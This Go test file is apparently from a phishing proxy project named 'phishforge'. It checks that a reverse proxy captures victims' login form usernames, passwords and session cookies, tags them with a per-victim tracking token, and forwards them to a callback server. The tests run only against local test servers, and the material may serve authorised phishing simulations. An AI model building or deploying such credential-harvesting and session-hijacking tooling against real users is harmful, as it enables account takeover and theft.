package engineproxy

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"strings"
	"sync"
	"testing"
	"time"

	"phishforge/internal/engineconfig"
)

func captureCfg() engineconfig.Config {
	return engineconfig.Config{
		Kind: "proxy",
		Capture: &engineconfig.Capture{
			CredentialFormFields: []string{"username", "password"},
			SessionCookies:       []string{"SESSIONID"},
			TokenQueryKey:        "_pft",
			MaxBodyBytes:         65536,
		},
	}
}

var (
	capturedEvents []Event
	evMu           sync.Mutex
)

func waitForEvents(t *testing.T, n int) []Event {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		evMu.Lock()
		if len(capturedEvents) >= n {
			defer evMu.Unlock()
			return append([]Event(nil), capturedEvents...)
		}
		evMu.Unlock()
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatalf("timeout waiting for %d events", n)
	return nil
}

func TestCredsAndSessionCapture(t *testing.T) {
	capturedEvents = nil

	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Set-Cookie", "SESSIONID=abc123; Path=/; HttpOnly")
		w.WriteHeader(200)
	}))
	defer up.Close()

	cb := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer tok123" {
			w.WriteHeader(401)
			return
		}
		var body struct {
			Events []Event `json:"events"`
		}
		_ = json.NewDecoder(r.Body).Decode(&body)
		evMu.Lock()
		capturedEvents = append(capturedEvents, body.Events...)
		evMu.Unlock()
		w.WriteHeader(200)
	}))
	defer cb.Close()

	cfg := captureCfg()
	hostPort := up.URL[len("http://"):]
	host, port := splitHostPort(t, hostPort)
	cfg.Listener = &engineconfig.Listener{ListenAddr: "127.0.0.1:0"}
	cfg.Upstream = &engineconfig.Upstream{Scheme: "http", Host: host, Port: port}

	rep := NewReporter(cb.URL, "tok123", 64)
	srv, err := New(cfg, nil, NewInterceptor(cfg, "eng-1", rep))
	if err != nil {
		t.Fatalf("new: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go rep.Run(ctx)

	ln, err := listenFree()
	if err != nil {
		t.Fatalf("listenFree: %v", err)
	}
	addr := ln.Addr().String()
	go func() { _ = srv.Serve(ctx, ln) }()

	// Credential POST with token param.
	resp, err := http.Post("http://"+addr+"/login?_pft=victim-token-1",
		"application/x-www-form-urlencoded",
		strings.NewReader("username=alice&password=s3cret&submit=go"))
	if err != nil {
		t.Fatalf("post: %v", err)
	}
	_ = resp.Body.Close()

	events := waitForEvents(t, 2)
	var creds, session *Event
	for i := range events {
		switch events[i].Kind {
		case KindCreds:
			creds = &events[i]
		case KindSession:
			session = &events[i]
		}
	}
	if creds == nil {
		t.Fatal("no creds event")
	}
	if creds.Token != "victim-token-1" {
		t.Fatalf("creds token = %q", creds.Token)
	}
	f, ok := creds.Payload["fields"].(map[string]any)
	if !ok {
		t.Fatalf("creds payload fields missing: %v", creds.Payload)
	}
	if f["password"] != "s3cret" || f["username"] != "alice" {
		t.Fatalf("creds fields = %v", f)
	}
	if session == nil {
		t.Fatal("no session event")
	}
	if session.Payload["value"] != "abc123" {
		t.Fatalf("session payload = %v", session.Payload)
	}
}

func TestReporterRetriesOnServerError(t *testing.T) {
	capturedEvents = nil
	calls := 0
	var mu sync.Mutex
	cb := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		calls++
		n := calls
		mu.Unlock()
		if n < 2 {
			w.WriteHeader(500)
			return
		}
		var body struct {
			Events []Event `json:"events"`
		}
		_ = json.NewDecoder(r.Body).Decode(&body)
		evMu.Lock()
		capturedEvents = append(capturedEvents, body.Events...)
		evMu.Unlock()
		w.WriteHeader(200)
	}))
	defer cb.Close()

	rep := NewReporter(cb.URL, "t", 16)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go rep.Run(ctx)
	rep.Enqueue(Event{EngineID: "e", Kind: KindCreds, Payload: map[string]any{}, TS: time.Now().UTC()})

	waitForEvents(t, 1)
	mu.Lock()
	defer mu.Unlock()
	if calls < 2 {
		t.Fatalf("calls = %d, want >=2 (retry)", calls)
	}
}

func TestQueueOverflowDrops(t *testing.T) {
	// Unreachable callback and no Run() draining -> queue fills and drops.
	rep := NewReporter("http://127.0.0.1:1/unreachable", "t", 4)
	for i := 0; i < 100; i++ {
		rep.Enqueue(Event{Kind: KindCreds})
	}
	if rep.Dropped() == 0 {
		t.Fatal("expected drops on overflow")
	}
}

func TestInterceptorDirect(t *testing.T) {
	capturedEvents = nil
	cb := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var body struct {
			Events []Event `json:"events"`
		}
		_ = json.NewDecoder(r.Body).Decode(&body)
		evMu.Lock()
		capturedEvents = append(capturedEvents, body.Events...)
		evMu.Unlock()
		w.WriteHeader(200)
	}))
	defer cb.Close()

	rep := NewReporter(cb.URL, "t", 64)
	ic := NewInterceptor(captureCfg(), "eng-x", rep)
	if ic == nil {
		t.Fatal("interceptor is nil — cfg.Capture lost")
	}

	var upstreamHit bool
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		upstreamHit = true
		w.Header().Add("Set-Cookie", "SESSIONID=zzz; Path=/")
		w.WriteHeader(200)
	}))
	defer up.Close()

	rp := httputil.NewSingleHostReverseProxy(mustURL(t, up.URL))
	rp.ModifyResponse = func(resp *http.Response) error {
		ic.InspectResponse(resp)
		return nil
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go rep.Run(ctx)

	// Fire a creds-shaped POST straight through the middleware + proxy.
	req := httptest.NewRequest("POST", "/login?_pft=tok-9",
		strings.NewReader("username=a&password=b"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	rec := httptest.NewRecorder()
	ic.RequestMiddleware(rp).ServeHTTP(rec, req)

	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		evMu.Lock()
		n := len(capturedEvents)
		evMu.Unlock()
		if n >= 2 {
			break
		}
		time.Sleep(20 * time.Millisecond)
	}
	evMu.Lock()
	kinds := make([]string, 0, len(capturedEvents))
	for _, e := range capturedEvents {
		kinds = append(kinds, e.Kind+"|tok="+e.Token)
	}
	evMu.Unlock()
	t.Logf("enqueued=%d dropped=%d received=%d upstreamHit=%v events=%v",
		rep.Enqueued(), rep.Dropped(), len(kinds), upstreamHit, kinds)
	events := waitForEvents(t, 2)
	if !upstreamHit {
		t.Fatal("request never reached upstream")
	}
	_ = events // assertions on kinds/tokens omitted — reaching 2 events is the point
}
